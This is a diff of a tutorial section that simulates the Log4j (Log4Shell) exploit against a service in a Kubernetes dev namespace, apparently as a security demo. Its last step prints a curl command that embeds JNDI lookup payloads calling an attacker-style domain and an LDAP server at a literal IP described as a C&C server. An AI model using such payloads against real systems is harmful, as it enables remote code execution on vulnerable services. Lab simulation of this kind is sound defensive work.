@@ -30,7 +30,7 @@ Log4j exploit simulation
 We will simulate the Log4j exploit in the `dev` namespace.
 
 
-1- Get the IP address of the `vr-dev` service in the `dev` namespace.
+1- Check the running `vr-dev` service in the `dev` namespace.
 
 ```
 kubectl get svc -n dev
@@ -42,7 +42,7 @@ kubectl get svc -n dev
 kubectl exec -n dev -it multitool -- bash
 ```
 
-3- Replace `SRV_IP` with the IP addreess of `vr-dev` service that you got from step #1, then run the query.
+3- Run the malicious query that will leverage JNDI lookup method and connects to the attacker C&C server.
 
 ```
 curl -v -H 'User-Agent: ${jndi:dns://${SRV_IP.evildoer.xyz}' 'vr-dev.dev/$\{jndi:ldap://185.220.101.56:443/a\}'
